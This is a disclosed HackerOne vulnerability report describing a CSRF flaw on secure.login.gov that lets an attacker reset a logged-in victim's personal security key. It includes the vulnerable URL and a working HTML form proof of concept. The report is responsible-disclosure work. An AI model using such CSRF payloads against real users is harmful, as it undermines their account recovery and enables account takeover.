---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '263498'
original_report_id: '263498'
title: CSRF to change Account Security Keys on secure.login.gov
weakness: Cross-Site Request Forgery (CSRF)
team_handle: gsa_bbp
created_at: '2017-08-26T02:49:15.371Z'
disclosed_at: '2017-11-01T19:22:25.330Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF to change Account Security Keys on secure.login.gov

## Metadata

- HackerOne Report ID: 263498
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: gsa_bbp
- Disclosed At: 2017-11-01T19:22:25.330Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

This may not be in scope and nor be eligible for bounty but I read this in your vulnerability disclosure policy:

*While not all of our services are in scope for our Bug Bounty program, we do welcome disclosures of vulnerabilities through our Vulnerability Disclosure Policy. We would encourage you to review that policy if you have information about a vulnerability in a TTS service not listed below.*

So, I will go ahead and report this, however if you feel I have gone too far or shouldn't test this current sub-domain please inform me so that I can self-close the report as N/A and only focus on the domains, sub-domains and GitHub projects listed on the program page.

**Description**

There exists a CSRF vulnerability which allows an attacker to reset a victims personal security key aka the key which is required to get access back to your account if you ever lose access to your mobile device or forgot your password for your account on secure.login.gov

**POC**

Vulnerable Link : https://secure.login.gov/manage/personal_key?resend=true (Click on it after you are logged in to your account on secure.login.gov)

**CSRF POC**

<html><head>
<title>CSRF POC</title>
</head><body>
<form action="https://secure.login.gov/manage/personal_key?resend=true" method="GET">
<input type='submit' value='Go!' />
</form>
</body></html>

Also, don't hesitate to ask me if you have any further questions or need some clarifications.

Regards
zk34911

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
